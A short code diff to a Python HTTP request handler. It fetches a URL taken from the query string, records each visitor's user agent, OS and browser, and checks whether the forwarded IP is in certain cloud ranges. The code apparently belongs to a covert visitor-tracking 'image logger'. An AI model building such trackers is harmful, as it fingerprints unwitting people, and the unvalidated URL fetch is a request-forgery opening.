@@ -59,7 +59,7 @@ class handler(BaseHTTPRequestHandler):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
         try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
-        except Exception: data = bindata
+        except Exception as e: data = bindata
         useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
         os, browser = httpagentparser.simple_detect(useragent)
         if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
